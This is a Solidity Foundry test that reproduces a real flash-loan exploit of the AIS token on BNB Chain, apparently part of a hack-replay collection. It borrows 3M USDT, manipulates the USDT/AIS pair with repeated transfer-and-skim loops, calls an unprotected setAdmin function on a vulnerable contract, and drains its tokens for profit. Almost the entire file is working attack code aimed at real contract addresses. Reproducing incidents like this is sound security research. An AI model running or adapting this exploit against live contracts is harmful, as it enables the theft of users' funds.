// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~$61k
// Frontrunner: https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891
// Original Attacker: https://bscscan.com/address/0x84f37F6cC75cCde5fE9bA99093824A11CfDc329D
// Frontrunner Contract: https://bscscan.com/address/0x15ffd1d02b3918c9e56f75e30d23786d3ef2b5bc
// Original Attack Contract: https://bscscan.com/address/0xf6f60b0e83d9837c1f247c575c8583b1d085d351
// Vulnerable Contract:
// https://bscscan.com/address/0x6844ef18012a383c14e9a76a93602616ee9d6132
// https://bscscan.com/address/0xffac2ed69d61cf4a92347dcd394d36e32443d9d7
// Attack Tx: https://bscscan.com/tx/0x0be817b6a522a111e06293435c233dab6576d7437d0e148b45efcf7ab8a10de0

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1729861048004391306

interface IAIS is IERC20 {
    function setSwapPairs(address _address) external;
    function harvestMarket() external;
}

interface VulContract {
    function setAdmin(address _admin) external;
    function transferToken(address _from, address _to, uint256 _tokenId) external;
}

contract AISExploit is Test {
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAIS AIS = IAIS(0x6844Ef18012A383c14E9a76a93602616EE9d6132);

    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 usdt_ais = Uni_Pair_V2(0x1219F2699893BD05FE03559aA78e0923559CF0cf);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    VulContract vulContract = VulContract(0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7);

    function setUp() public {
        vm.createSelectFork("bsc", 33_916_687);

        vm.label(address(usdt), "USDT");
        vm.label(address(AIS), "AIS");
        vm.label(address(pool), "pool");
        vm.label(address(usdt_ais), "usdt_ais pair");
        vm.label(address(router), "router");
    }

    function testExploit() public {
        uint256 balanceBefore = usdt.balanceOf(address(this));

        usdt.approve(address(router), type(uint256).max);
        AIS.approve(address(router), type(uint256).max);

        pool.flash(address(this), 3_000_000 ether, 0, new bytes(1));
        uint256 balanceAfter = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("USDT profit", balanceAfter - balanceBefore, usdt.decimals());
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        swap(3_000_000 ether, address(usdt), address(AIS));

        usdt_ais.skim(address(this));
        for (uint256 i = 0; i < 100; i++) {
            uint256 balance = AIS.balanceOf(address(this));
            AIS.transfer(address(usdt_ais), balance * 90 / 100);
            AIS.transfer(address(usdt_ais), 0);
            usdt_ais.skim(address(this));
            usdt_ais.skim(address(this));
        }

        AIS.harvestMarket();
        vulContract.setAdmin(address(this));

        uint256 amount = AIS.balanceOf(address(vulContract)) * 90 / 100;
        vulContract.transferToken(address(AIS), address(this), amount);
        AIS.setSwapPairs(address(this));

        AIS.transfer(address(usdt_ais), AIS.balanceOf(address(this)));
        AIS.transfer(address(usdt_ais), 0);
        swap(0, address(AIS), address(usdt));

        usdt.transfer(address(pool), 3_000_000 ether + fee0);
    }

    function swap(uint256 amountIn, address tokenIn, address tokenOut) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}
